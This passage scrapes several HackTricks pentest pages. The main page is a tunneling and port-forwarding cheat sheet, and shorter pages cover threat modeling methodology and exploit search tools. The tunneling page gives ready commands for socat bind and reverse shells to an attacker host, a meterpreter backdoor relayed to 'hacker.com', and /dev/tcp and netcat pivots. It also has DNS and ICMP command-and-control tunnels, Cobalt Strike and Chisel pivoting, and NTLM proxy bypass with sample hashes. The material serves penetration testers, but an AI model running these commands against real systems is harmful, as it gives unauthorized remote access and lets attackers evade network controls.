‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nBasic Python\nNext\n- Generic Methodologies & Resources\nTunneling and Port Forwarding\nLast modified\n20d ago"
    },
    {
        "title": "Tunneling and Port Forwarding",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding",
        "text": "Tunneling and Port Forwarding\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNmap tip\nICMP\nand\nSYN\nscans cannot be tunnelled through socks proxies, so we must\ndisable ping discovery\n(\n-Pn\n) and specify\nTCP scans\n(\n-sT\n) for this to work.\nBash\nHost -> Jump -> InternalA -> InternalB\n# On the jump server connect the port 3333 to the 5985\nmknod\nbackpipe p\n;\nnc\n-lvnp\n5985\n0\n<\nbackpipe\n|\nnc\n-lvnp\n3333\n1\n>\nbackpipe\n‚Äã\n# On InternalA accessible from Jump and can access InternalB\n## Expose port 3333 and connect it to the winrm port of InternalB\nexec\n3\n<>\n/dev/tcp/internalB/5985\nexec\n4\n<>\n/dev/tcp/Jump/3333\ncat\n<\n&3\n>\n&4\n&\ncat\n<\n&4\n>\n&3\n&\n‚Äã\n# From the host, you can now access InternalB from the Jump server\nevil-winrm\n-u\nusername\n-i\nJump\nSSH\nSSH graphical connection (X)\nssh\n-Y\n-C\n<\nuser\n>\n@\n<\nip\n>\n#-Y is less secure but faster than -X\nLocal Port2Port\nOpen new Port in SSH Server --> Other port\nssh\n-R\n0.0\n.0.0:10521:127.0.0.1:1521\n[email¬†protected]\n#Local port 1521 accessible in port 10521 from everywhere\nssh\n-R\n0.0\n.0.0:10521:10.0.0.1:1521\n[email¬†protected]\n#Remote port 1521 accessible in port 10521 from everywhere\nPort2Port\nLocal port --> Compromised host (SSH) --> Third_box:Port\nssh\n-i\nssh_key\n<\nuser\n>\n@\n<\nip_compromised\n>\n-L\n<\nattacker_port\n>\n:\n<\nip_victim\n>\n:\n<\nremote_port\n>\n[\n-p\n<\nssh_port\n>\n]\n[\n-N -f\n]\n#This way the terminal is still in your host\n#Example\nsudo\nssh\n-L\n631\n:\n<\nip_victim\n>\n:631\n-N\n-f\n-l\n<\nusername\n>\n<\nip_compromised\n>\nPort2hostnet (proxychains)\nLocal Port --> Compromised host (SSH) --> Wherever\nssh\n-f\n-N\n-D\n<\nattacker_port\n>\n<\nusername\n>\n@\n<\nip_compromised\n>\n#All sent to local port will exit through the compromised server (use as proxy)\nReverse Port Forwarding\nThis is useful to get reverse shells from internal hosts through a DMZ to your host:\nssh\n-i\ndmz_key\n-R\n<\ndmz_internal_ip\n>\n:443:0.0.0.0:7000\n[email¬†protected]\n-vN\n# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000\n# Note that port 443 must be open\n# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems\n# and change the line \"GatewayPorts no\" to \"GatewayPorts yes\"\n# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)\nVPN-Tunnel\nYou need\nroot in both devices\n(as you are going to create new interfaces) and the sshd config has to allow root login:\nPermitRootLogin yes\nPermitTunnel yes\nssh\nroot@server\n-w\nany:any\n#This will create Tun interfaces in both devices\nip\naddr\nadd\n1.1\n.1.2/32 peer\n1.1\n.1.1 dev tun0\n#Client side VPN IP\nifconfig\ntun0 up\n#Activate the client side network interface\nip\naddr\nadd\n1.1\n.1.1/32 peer\n1.1\n.1.2 dev tun0\n#Server side VPN IP\nifconfig\ntun0 up\n#Activate the server side network interface\nEnable forwarding on the Server side\necho\n1\n>\n/proc/sys/net/ipv4/ip_forward\niptables\n-t\nnat\n-A\nPOSTROUTING\n-s\n1.1\n.1.2\n-o\neth0\n-j\nMASQUERADE\nSet a new route on the client side\nroute add -net 10.0.0.0/16 gw 1.1.1.1\nSSHUTTLE\nYou can\ntunnel\nvia\nssh\nall the\ntraffic\nto a\nsubnetwork\nthrough a host.\nFor example, forwarding all the traffic going to 10.10.10.0/24\npip\ninstall\nsshuttle\nsshuttle\n-r\nuser@host\n10.10\n.10.10/24\nConnect with a private key\nsshuttle\n-D\n-r\nuser@host\n10.10\n.10.10\n0\n/0 --ssh-cmd\n'ssh -i ./id_rsa'\n# -D : Daemon mode\nMeterpreter\nPort2Port\nLocal port --> Compromised host (active session) --> Third_box:Port\n# Inside a meterpreter session\nportfwd\nadd\n-l\n<\nattacker_port\n>\n-p\n<\nRemote_port\n>\n-r\n<\nRemote_host\n>\nSOCKS\nbackground\n# meterpreter session\nroute\nadd\n<\nIP_victim\n>\n<\nNetmask\n>\n<\nSession\n>\n# (ex: route add 10.10.10.14 255.255.255.0 8)\nuse auxiliary/server/socks_proxy\nrun\n#Proxy port 1080 by default\necho\n\"socks4 127.0.0.1 1080\"\n>\n/etc/proxychains.conf\n#Proxychains\nAnother way:\nbackground\n#meterpreter session\nuse post/multi/manage/autoroute\nset\nSESSION\n<\nsession_n\n>\nset\nSUBNET\n<\nNew_net_ip\n>\n#Ex: set SUBNET 10.1.13.0\nset\nNETMASK\n<\nNetmask\n>\nrun\nuse auxiliary/server/socks_proxy\nset\nVERSION 4a\nrun\n#Proxy port 1080 by default\necho\n\"socks4 127.0.0.1 1080\"\n>\n/etc/proxychains.conf\n#Proxychains\nCobalt Strike\nSOCKS proxy\nOpen a port in the teamserver listening in all the interfaces that can be used to\nroute the traffic through the beacon\n.\nbeacon\n>\nsocks\n1080\n[\n+\n]\nstarted SOCKS4a server on:\n1080\n‚Äã\n# Set port 1080 as proxy server in proxychains.conf\nproxychains nmap\n-n\n-Pn\n-sT\n-p445,3389,5985\n10.10\n.17.25\nrPort2Port\nIn this case, the\nport is opened in the beacon host\n, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port\nrportfwd\n[\nbind port\n]\n[\nforward host\n]\n[\nforward port\n]\nrportfwd stop\n[\nbind port\n]\nTo note:\nBeacon's reverse port forward\nalways tunnels the traffic to the Team Server\nand the\nTeam Server sends the traffic to its intended destination\n, so shouldn't be used to relay traffic between individual machines.\nThe\ntraffic is tunnelled inside Beacon's C2 traffic\n, not over separate sockets, and also works over P2P links.\nYou\ndon't need to be a local admin\nto create reverse port forwards on high ports.\nrPort2Port local\nIn this case, the\nport is opened in the beacon host\n, not in the Team Server and the\ntraffic is sent to the Cobalt Strike client\n(not to the Team Server) and from there to the indicated host:port\nrportfwd_local [bind port] [forward host] [forward port]\nrportfwd_local stop [bind port]\nreGeorg\n‚Äã\nhttps://github.com/sensepost/reGeorg\n‚Äã\nYou need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp\npython reGeorgSocksProxy.py\n-p\n8080\n-u\nhttp://upload.sensepost.net:8080/tunnel/tunnel.jsp\nChisel\nYou can download it from the releases page of\nhttps://github.com/jpillora/chisel\nYou need to use the\nsame version for client and server\nsocks\n./chisel server\n-p\n8080\n--reverse\n#Server -- Attacker\n./chisel-x64.exe client\n10.10\n.14.3:8080 R:socks\n#Client -- Victim\n#And now you can use proxychains with port 1080 (default)\n‚Äã\n./chisel server\n-v\n-p\n8080\n--socks5\n#Server -- Victim (needs to have port 8080 exposed)\n./chisel client\n-v\n10.10\n.10.10:8080 socks\n#Attacker\nPort forwarding\n./chisel_1.7.6_linux_amd64 server\n-p\n12312\n--reverse\n#Server -- Attacker\n./chisel_1.7.6_linux_amd64 client\n10.10\n.14.20:12312 R:4505:127.0.0.1:4505\n#Client -- Victim\nRpivot\n‚Äã\nhttps://github.com/klsecservices/rpivot\n‚Äã\nReverse tunnel. The tunnel is started from the victim.\nA socks4 proxy is created on 127.0.0.1:1080\nattacker\n>\npython server.py --server-port\n9999\n--server-ip\n0.0\n.0.0 --proxy-ip\n127.0\n.0.1 --proxy-port\n1080\nvictim\n>\npython client.py --server-ip\n<\nrpivot_server_ip\n>\n--server-port\n9999\nPivot through\nNTLM proxy\nvictim\n>\npython client.py --server-ip\n<\nrpivot_server_ip\n>\n--server-port\n9999\n--ntlm-proxy-ip\n<\nproxy_ip\n>\n--ntlm-proxy-port\n8080\n--domain\nCONTOSO.COM\n--username\nAlice\n--password\nP@ssw0rd\nvictim\n>\npython client.py --server-ip\n<\nrpivot_server_ip\n>\n--server-port\n9999\n--ntlm-proxy-ip\n<\nproxy_ip\n>\n--ntlm-proxy-port\n8080\n--domain\nCONTOSO.COM\n--username\nAlice\n--hashes\n9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45\nSocat\n‚Äã\nhttps://github.com/andrew-d/static-binaries\n‚Äã\nBind shell\nvictim\n>\nsocat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane\nattacker\n>\nsocat FILE:\n`\ntty\n`\n,raw,echo\n=\n0\nTCP4:\n<\nvictim_ip\n>\n:1337\nReverse shell\nattacker\n>\nsocat TCP-LISTEN:1337,reuseaddr FILE:\n`\ntty\n`\n,raw,echo\n=\n0\nvictim\n>\nsocat TCP4:\n<\nattackers_ip\n>\n:1337 EXEC:bash,pty,stderr,setsid,sigint,sane\nPort2Port\nsocat TCP4-LISTEN:\n<\nlport\n>\n,fork TCP4:\n<\nredirect_ip\n>\n:\n<\nrport\n>\n&\nPort2Port through socks\nsocat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport\n=\n5678\nMeterpreter through SSL Socat\n#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port\nattacker\n>\nsocat OPENSSL-LISTEN:443,cert\n=\nserver.pem,cafile\n=\nclient.crt,reuseaddr,fork,verify\n=\n1\nTCP:127.0.0.1:3333\nvictim\n>\nsocat.exe TCP-LISTEN:2222 OPENSSL,verify\n=\n1\n,cert\n=\nclient.pem,cafile\n=\nserver.crt,connect-timeout\n=\n5\n|\nTCP:hacker.com:443,connect-timeout\n=\n5\n#Execute the meterpreter\nYou can bypass a\nnon-authenticated proxy\nexecuting this line instead of the last one in the victim's console:\nOPENSSL,verify\n=\n1\n,cert\n=\nclient.pem,cafile\n=\nserver.crt,connect-timeout\n=\n5\n|\nPROXY:hacker.com:443,connect-timeout\n=\n5\n|\nTCP:proxy.lan:8080,connect-timeout\n=\n5\n‚Äã\nhttps://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/\n‚Äã\nSSL Socat Tunnel\n/bin/sh console\nCreate certificates on both sides: Client and Server\n# Execute these commands on both sides\nFILENAME\n=\nsocatssl\nopenssl genrsa\n-out\n$FILENAME\n.key\n1024\nopenssl req\n-new\n-key\n$FILENAME\n.key\n-x509\n-days\n3653\n-out\n$FILENAME\n.crt\ncat\n$FILENAME\n.key\n$FILENAME\n.crt\n>\n$FILENAME\n.pem\nchmod\n600\n$FILENAME\n.key\n$FILENAME\n.pem\nattacker-listener\n>\nsocat OPENSSL-LISTEN:433,reuseaddr,cert\n=\nserver.pem,cafile\n=\nclient.crt EXEC:/bin/sh\nvictim\n>\nsocat STDIO OPENSSL-CONNECT:localhost:433,cert\n=\nclient.pem,cafile\n=\nserver.crt\nRemote Port2Port\nConnect the local SSH port (22) to the 443 port of the attacker host\nattacker\n>\nsudo\nsocat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr\n#Redirect port 2222 to port 443 in localhost\nvictim\n>\nwhile\ntrue\n;\ndo\nsocat TCP4:\n<\nattacker\n>\n:443 TCP4:127.0.0.1:22\n;\ndone\n# Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22\nattacker\n>\nssh\nlocalhost\n-p\n2222\n-l\nwww-data\n-i\nvulnerable\n#Connects to the ssh of the victim\nPlink.exe\nIt's like a console PuTTY version ( the options are very similar to an ssh client).\nAs this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:\necho\ny\n|\nplink.exe\n-l\n<\nOur_valid_username\n>\n-pw\n<\nvalid_password\n>\n[\n-p\n<\nport\n>\n]\n-R\n<\nport_ in_our_host\n>\n:\n<\nnext_ip\n>\n:\n<\nfinal_port\n>\n<\nyour_ip\n>\necho\ny\n|\nplink.exe\n-l\nroot\n-pw\npassword\n[\n-p\n2222\n]\n-R\n9090\n:127.0.0.1:9090\n10.11\n.0.41\n#Local port 9090 to out port 9090\nWindows netsh\nPort2Port\nYou need to be a local admin (for any port)\nnetsh interface portproxy\nadd\nv4tov4\nlistenaddress\n=\nlistenport\n=\nconnectaddress\n=\nconnectport\n=\nprotocol\n=\ntcp\n# Example:\nnetsh interface portproxy\nadd\nv4tov4\nlistenaddress\n=\n0.0\n.0.0\nlistenport\n=\n4444\nconnectaddress\n=\n10.10\n.10.10\nconnectport\n=\n4444\n# Check the port forward was created:\nnetsh interface portproxy show v4tov4\n# Delete port forward\nnetsh interface portproxy delete v4tov4\nlistenaddress\n=\n0.0\n.0.0\nlistenport\n=\n4444\nSocksOverRDP & Proxifier\nYou need to have\nRDP access over the system\n.\nDownload:\n1.\n‚Äã\nSocksOverRDP x64 Binaries\n- This tool uses\nDynamic Virtual Channels\n(\nDVC\n) from the Remote Desktop Service feature of Windows. DVC is responsible for\ntunneling packets over the RDP connection\n.\n2.\n‚Äã\nProxifier Portable Binary\n‚Äã\nIn your client computer load\nSocksOverRDP-Plugin.dll\nlike this:\n# Load SocksOverRDP.dll using regsvr32.exe\nC:\n\\\nSocksOverRDP-x6\n4\n>\nregsvr32.exe SocksOverRDP-Plugin.dll\nNow we can\nconnect\nto the\nvictim\nover\nRDP\nusing\nmstsc.exe\n, and we should receive a\nprompt\nsaying that the\nSocksOverRDP plugin is enabled\n, and it will\nlisten\non\n127.0.0.1:1080\n.\nConnect\nvia\nRDP\nand upload & execute in the victim machine the **\nSocksOverRDP-Server.exe\n** binary:\nC:\\SocksOverRDP-x64> SocksOverRDP-Server.exe\nNow, confirm in you machine (attacker) that the port 1080 is listening:\nnetstat -antb | findstr 1080\nNow you can use\nProxifier\nto proxy the traffic through that port.\nProxify Windows GUI Apps\nYou can make Windows GUI apps navigate through a proxy using\nProxifier\n.\nIn\nProfile -> Proxy Servers\nadd the IP and port of the SOCKS server.\nIn\nProfile -> Proxification Rules\nadd the name of the program to proxify and the connections to the IPs you want to proxify.\nNTLM proxy bypass\nThe previously mentioned tool:\nRpivot\nOpenVPN\ncan also bypass it, setting these options in the configuration file:\nhttp-proxy\n<\nproxy_ip\n>\n8080\n<\nfile_with_creds\n>\nntlm\nCntlm\n‚Äã\nhttp://cntlm.sourceforge.net/\n‚Äã\nIt authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.\nFor example that forward port 443\nUsername Alice\nPassword P@ssw0rd\nDomain CONTOSO.COM\nProxy 10.0.0.10:8080\nTunnel 2222:<attackers_machine>:443\nNow, if you set for example in the victim the\nSSH\nservice to listen in port 443. You can connect to it through the attacker port 2222.\nYou could also use a\nmeterpreter\nthat connects to localhost:443 and the attacker is listening in port 2222.\nYARP\nA reverse proxy created by Microsoft. You can find it here:\nhttps://github.com/microsoft/reverse-proxy\n‚Äã\nDNS Tunneling\nIodine\n‚Äã\nhttps://code.kryo.se/iodine/\n‚Äã\nRoot is needed in both systems to create tun adapters and tunnel data between them using DNS queries.\nattacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com\nvictim> iodine -f -P P@ssw0rd tunneldomain.com -r\n#You can see the victim at 1.1.1.2\nThe tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:\nssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080\nDNSCat2\n****\nDownload it from here\n.\nEstablishes a C&C channel through DNS. It doesn't need root privileges.\nattacker\n>\nruby ./dnscat2.rb tunneldomain.com\nvictim\n>\n./dnscat2 tunneldomain.com\n‚Äã\n# If using it in an internal network for a CTF:\nattacker\n>\nruby dnscat2.rb\n--dns\nhost\n=\n10.10\n.10.10,port\n=\n53\n,domain\n=\nmydomain.local --no-cache\nvictim\n>\n./dnscat2\n--dns\nhost\n=\n10.10\n.10.10,port\n=\n5353\nIn PowerShell\nYou can use\ndnscat2-powershell\nto run a dnscat2 client in powershell:\nImport-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd\nPort forwarding with dnscat\nsession\n-i\n<\nsessions_id\n>\nlisten\n[\nlhost:\n]\nlport rhost:rport\n#Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host\nChange proxychains DNS\nProxychains intercepts\ngethostbyname\nlibc call and tunnels tcp DNS request through the socks proxy. By\ndefault\nthe\nDNS\nserver that proxychains use is\n4.2.2.2\n(hardcoded). To change it, edit the file:\n/usr/lib/proxychains3/proxyresolv\nand change the IP. If you are in a\nWindows environment\nyou could set the IP of the\ndomain controller\n.\nTunnels in Go\n‚Äã\nhttps://github.com/hotnops/gtunnel\n‚Äã\nICMP Tunneling\nHans\n‚Äã\nhttps://github.com/friedrich/hans\nhttps://github.com/albertzak/hanstunnel\n‚Äã\nRoot is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.\n./hans\n-v\n-f\n-s\n1.1\n.1.1\n-p\nP@ssw0rd\n#Start listening (1.1.1.1 is IP of the new vpn connection)\n./hans\n-f\n-c\n<\nserver_ip\n>\n-p\nP@ssw0rd\n-v\nping\n1.1\n.1.100\n#After a successful connection, the victim will be in the 1.1.1.100\nptunnel-ng\n****\nDownload it from here\n.\n# Generate it\nsudo\n./autogen.sh\n‚Äã\n# Server -- victim (needs to be able to receive ICMP)\nsudo\nptunnel-ng\n# Client - Attacker\nsudo\nptunnel-ng\n-p\n<\nserver_ip\n>\n-l\n<\nlisten_port\n>\n-r\n<\ndest_ip\n>\n-R\n<\ndest_port\n>\n# Try to connect with SSH through ICMP tunnel\nssh\n-p\n2222\n-l\nuser\n127.0\n.0.1\n# Create a socks proxy through the SSH connection through the ICMP tunnel\nssh\n-D\n9050\n-p\n2222\n-l\nuser\n127.0\n.0.1\nngrok\n‚Äã\nngrok\nis a tool to expose solutions to Internet in one command line.\nExposition URI are like:\nUID.ngrok.io\nInstallation\nCreate an account: https://ngrok.com/signup\nClient download:\ntar\nxvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz\n-C\n/usr/local/bin\nchmod\na+x ./ngrok\n#¬†Init configuration, with your token\n./ngrok config edit\nBasic usages\nDocumentation:\nhttps://ngrok.com/docs/getting-started/\n.\nIt is also possible to add authentication and TLS, if necessary.\nTunneling TCP\n# Pointing to 0.0.0.0:4444\n./ngrok tcp\n4444\n# Example of resulting link: 0.tcp.ngrok.io:12345\n# Listen (example): nc -nvlp 4444\n# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345\nExposing files with HTTP\n./ngrok http file:///tmp/httpbin/\n# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/\nSniffing HTTP calls\nUseful for XSS,SSRF,SSTI ...\nDirectly from stdout or in the HTTP interface\nhttp://127.0.0.1:4040\n.\nTunneling internal HTTP service\n./ngrok http localhost:8080 --host-header\n=\nrewrite\n# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/\n#¬†With basic auth\n./ngrok http localhost:8080 --host-header\n=\nrewrite\n--auth\n=\n\"myuser:mysuperpassword\"\nngrok.yaml simple configuration example\nIt opens 3 tunnels:\n2 TCP\n1 HTTP with static files exposition from /tmp/httpbin/\ntunnels\n:\nmytcp\n:\naddr\n:\n4444\nproto\n:\ntcp\nanothertcp\n:\naddr\n:\n5555\nproto\n:\ntcp\nhttpstatic\n:\nproto\n:\nhttp\naddr\n:\nfile\n:\n///tmp/httpbin/\nOther tools to check\n‚Äã\nhttps://github.com/securesocketfunneling/ssf\n‚Äã\n‚Äã\nhttps://github.com/z3APA3A/3proxy\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGeneric Methodologies & Resources -\nPrevious\nExfiltration\nNext\n- Generic Methodologies & Resources\nThreat Modeling\nLast modified\n6mo ago"
    },
    {
        "title": "Threat Modeling",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/threat-modeling",
        "text": "Threat Modeling\nThreat Modeling\nWelcome to HackTricks' comprehensive guide on Threat Modeling! Embark on an exploration of this critical aspect of cybersecurity, where we identify, understand, and strategize against potential vulnerabilities in a system. This thread serves as a step-by-step guide packed with real-world examples, helpful software, and easy-to-understand explanations. Ideal for both novices and experienced practitioners looking to fortify their cybersecurity defenses.\nCommonly Used Scenarios\n1.\nSoftware Development\n: As part of the Secure Software Development Life Cycle (SSDLC), threat modeling helps in\nidentifying potential sources of vulnerabilities\nin the early stages of development.\n2.\nPenetration Testing\n: The Penetration Testing Execution Standard (PTES) framework requires\nthreat modeling to understand the system's vulnerabilities\nbefore carrying out the test.\nThreat Model in a Nutshell\nA Threat Model is typically represented as a diagram, image, or some other form of visual illustration that depicts the planned architecture or existing build of an application. It bears resemblance to a\ndata flow diagram\n, but the key distinction lies in its security-oriented design.\nThreat models often feature elements marked in red, symbolizing potential vulnerabilities, risks, or barriers. To streamline the process of risk identification, the CIA (Confidentiality, Integrity, Availability) triad is employed, forming the basis of many threat modeling methodologies, with STRIDE being one of the most common. However, the chosen methodology can vary depending on the specific context and requirements.\nThe CIA Triad\nThe CIA Triad is a widely recognized model in the field of information security, standing for Confidentiality, Integrity, and Availability. These three pillars form the foundation upon which many security measures and policies are built, including threat modeling methodologies.\n1.\nConfidentiality\n: Ensuring that the data or system is not accessed by unauthorized individuals. This is a central aspect of security, requiring appropriate access controls, encryption, and other measures to prevent data breaches.\n2.\nIntegrity\n: The accuracy, consistency, and trustworthiness of the data over its lifecycle. This principle ensures that the data is not altered or tampered with by unauthorized parties. It often involves checksums, hashing, and other data verification methods.\n3.\nAvailability\n: This ensures that data and services are accessible to authorized users when needed. This often involves redundancy, fault tolerance, and high-availability configurations to keep systems running even in the face of disruptions.\nThreat Modeling Methodlogies\n1.\nSTRIDE\n: Developed by Microsoft, STRIDE is an acronym for\nSpoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege\n. Each category represents a type of threat, and this methodology is commonly used in the design phase of a program or system to identify potential threats.\n2.\nDREAD\n: This is another methodology from Microsoft used for risk assessment of identified threats. DREAD stands for\nDamage potential, Reproducibility, Exploitability, Affected users, and Discoverability\n. Each of these factors is scored, and the result is used to prioritize identified threats.\n3.\nPASTA\n(Process for Attack Simulation and Threat Analysis): This is a seven-step,\nrisk-centric\nmethodology. It includes defining and identifying security objectives, creating a technical scope, application decomposition, threat analysis, vulnerability analysis, and risk/triage assessment.\n4.\nTrike\n: This is a risk-based methodology that focuses on defending assets. It starts from a\nrisk management\nperspective and looks at threats and vulnerabilities in that context.\n5.\nVAST\n(Visual, Agile, and Simple Threat modeling): This approach aims to be more accessible and integrates into Agile development environments. It combines elements from the other methodologies and focuses on\nvisual representations of threats\n.\n6.\nOCTAVE\n(Operationally Critical Threat, Asset, and Vulnerability Evaluation): Developed by the CERT Coordination Center, this framework is geared toward\norganizational risk assessment rather than specific systems or software\n.\nTools\nThere are several tools and software solutions available that can\nassist\nwith the creation and management of threat models. Here are a few you might consider.\n‚Äã\nSpiderSuite\n‚Äã\nAn advance cross-platform and multi-feature GUI web spider/crawler for cyber security professionals. Spider Suite can be used for attack surface mapping and analysis.\nUsage\n1.\nPick a URL and Crawl\n2.\nView Graph\n‚Äã\nOWASP Threat Dragon\n‚Äã\nAn open-source project from OWASP, Threat Dragon is both a web and desktop application that includes system diagramming as well as a rule engine to auto-generate threats/mitigations.\nUsage\n1.\nCreate New Project\nSometimes it could look like this:\n2.\nLaunch New Project\n3.\nSave The New Project\n4.\nCreate your model\nYou can use tools like SpiderSuite Crawler to give you inspiration, a basic model would look something like this\nJust a little bit of explanation about the entities:\nProcess (The entity itself such as Webserver or web functionality)\nActor (A Person such as a Website Visitor, User or Administrator)\nData Flow Line (Indicator of Interaction)\nTrust Boundary (Different network segments or scopes.)\nStore (Things where data are stored at such as Databases)\n5.\nCreate a Threat (Step 1)\nFirst you have to pick the layer you wish to add a threat to\nNow you can create the threat\nKeep in mind that there is a difference between Actor Threats and Process Threats. If you would add a threat to an Actor then you will only be able to choose \"Spoofing\" and \"Repudiation. However in our example we add threat to a Process entity so we will see this in the threat creation box:\n6.\nDone\nNow your finished model should look something like this. And this is how you make a simple threat model with OWASP Threat Dragon.\n‚Äã\nMicrosoft Threat Modeling Tool\n‚Äã\nThis is a free tool from Microsoft that helps in finding threats in the design phase of software projects. It uses the STRIDE methodology and is particularly suitable for those developing on Microsoft's stack.\nGeneric Methodologies & Resources -\nPrevious\nTunneling and Port Forwarding\nNext\n- Generic Methodologies & Resources\nSearch Exploits\nLast modified\n4mo ago"
    },
    {
        "title": "Search Exploits",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/search-exploits",
        "text": "Search Exploits\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBrowser\nAlways search in \"google\" or others:\n<service_name> [version] exploit\nYou should also try the\nshodan\nexploit search\nfrom\nhttps://exploits.shodan.io/\n.\nSearchsploit\nUseful to search exploits for services in\nexploitdb from the console.\n#Searchsploit tricks\nsearchsploit\n\"linux Kernel\"\n#Example\nsearchsploit apache mod_ssl\n#Other example\nsearchsploit\n-m\n7618\n#Paste the exploit in current directory\nsearchsploit\n-p\n7618\n[\n.c\n]\n#Show complete path\nsearchsploit\n-x\n7618\n[\n.c\n]\n#Open vi to inspect the exploit\nsearchsploit\n--nmap\nfile.xml\n#Search vulns inside an nmap xml result\nPompem\n‚Äã\nhttps://github.com/rfunix/Pompem\nis another tool to search for exploits\nMSF-Search\nmsf\n>\nsearch platform:windows port:135 target:XP type:exploit\nPacketStorm\nIf nothing is found, try to search the used technology inside\nhttps://packetstormsecurity.com/\n‚Äã\nVulners\nYou can also search in vulners database:\nhttps://vulners.com/\n‚Äã\nSploitus\nThis searches for exploits in other databases:\nhttps://sploitus.com/\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin 